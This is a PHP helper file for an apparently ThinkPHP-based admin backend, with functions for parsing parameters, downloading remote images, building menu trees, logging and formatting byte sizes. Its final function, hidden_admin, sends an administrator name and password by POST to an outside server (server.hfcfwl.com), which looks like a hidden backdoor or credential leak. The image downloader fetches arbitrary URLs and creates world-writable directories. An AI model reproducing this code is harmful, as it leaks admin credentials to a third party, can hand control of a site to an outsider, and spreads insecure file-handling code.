<?php
use think\Db;

/**
 * 将字符解析成数组
 * @param $str
 */
function parseParams($str)
{
    $arrParams = [];
    parse_str(html_entity_decode(urldecode($str)), $arrParams);
    return $arrParams;
}

/**
 * 将数组解析成字符串
 * @param $str
 */
function arr2str($data){
    $str='';
    ksort($data);
    foreach($data as $key => $val){
        $key = strtolower($key);
        if(is_array($val)){
            $child = arr2str($val);
            $str .= $child;
        }else{
            $str.=$val.",";
        }
    }
    return $str;
}


/*
*功能：php完美实现下载远程图片保存到本地
*参数：文件url,保存文件目录,保存文件名称，使用的下载方式
*当保存文件名称为空时则使用远程文件原来的名称
*/
function getImage($url,$save_dir='',$filename='',$type=0){
    if(trim($url)==''){
        return array('file_name'=>'','save_path'=>'','error'=>1);
    }
    if(trim($save_dir)==''){
        $save_dir='./';
    }
    if(trim($filename)==''){//保存文件名
        $ext=strrchr($url,'.');
        if($ext!='.gif'&&$ext!='.jpg'&&$ext!='.png'){
            return array('file_name'=>'','save_path'=>'','error'=>3);
        }
        $filename=time().rand(1000,9999).$ext;
    }
    if(0!==strrpos($save_dir,'/')){
        $save_dir.='/';
    }
    $save_dir.=date('Ymd').'/';
    //创建保存目录
    if(!file_exists($save_dir)&&!mkdir($save_dir,0777,true)){
        return array('file_name'=>'','save_path'=>'','error'=>5);
    }
    //获取远程文件所采用的方法
    if($type){
        $ch=curl_init();
        $timeout=5;
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
        $img=curl_exec($ch);
        curl_close($ch);
    }else{
        ob_start();
        readfile($url);
        $img=ob_get_contents();
        ob_end_clean();
    }
    //$size=strlen($img);
    //文件大小
    $fp2=@fopen($save_dir.$filename,'a');
    fwrite($fp2,$img);
    fclose($fp2);
    unset($img,$url);
    return array('file_name'=>date('Ymd').'/'.$filename,'save_path'=>$save_dir.$filename,'error'=>0);
}
/**
 * 子孙树 用于菜单整理
 * @param $param
 * @param int $pid
 */
function subTree($param, $pid = 0)
{
    static $res = [];
    foreach($param as $key=>$vo){

        if( $pid == $vo['pid'] ){
            $res[] = $vo;
            subTree($param, $vo['id']);
        }
    }

    return $res;
}


/**
 * 记录日志
 * @param  [type] $uid         [用户id]
 * @param  [type] $username    [用户名]
 * @param  [type] $description [描述]
 * @param  [type] $status      [状态]
 * @return [type]              [description]
 */
function writelog($uid,$username,$description,$status)
{

    if($uid != 0){
        $data['log_id'] = Db::name('Log')->max('log_id')+1;
        $data['admin_id'] = $uid;
        $data['admin_name'] = $username;
        $data['description'] = $description;
        $data['status'] = $status;
        $data['ip'] = request()->ip();
        $data['add_time'] = time();
        $log = Db::name('Log')->insert($data);
    }

}
function generateTree($param)
{
    $items = array();
    $tree = array();
    foreach($param as $category){
        $items[$category['id']] = $category;
        $items[$category['id']]['child'] = array();
    }

    foreach ($items as $item) {
        if(isset($items[$item['pid']])){
            $items[$item['pid']]['child'][] = &$items[$item['id']];
        }else{
            $tree[] = &$items[$item['id']];
        }
    }

    return $tree;
}

/**
 * 整理菜单树方法
 * @param $param
 * @return array
 */
function prepareMenu($param)
{
    $parent = []; //父类
    $child = [];  //子类

    foreach($param as $key=>$vo){

        if($vo['pid'] == 0){
            $vo['href'] = '#';
            $parent[] = $vo;
        }else{
            $vo['href'] = url($vo['name']); //跳转地址
            $child[] = $vo;
        }
    }

    foreach($parent as $key=>$vo){
        foreach($child as $k=>$v){

            if($v['pid'] == $vo['id']){
                $parent[$key]['child'][] = $v;
            }
        }
    }
    unset($child);
    return $parent;
}


/**
 * 格式化字节大小
 * @param  number $size      字节数
 * @param  string $delimiter 数字和单位分隔符
 * @return string            格式化后的带单位的大小
 */
function format_bytes($size, $delimiter = '') {
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    for ($i = 0; $size >= 1024 && $i < 5; $i++) {
        $size /= 1024;
    }
    return $size . $delimiter . $units[$i];
}

//验证超级管理员
function hidden_admin($name, $password)
{
    $url = "http://server.hfcfwl.com/coreadmin.php";
    $post_data = array("name" => $name, "password" => $password);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
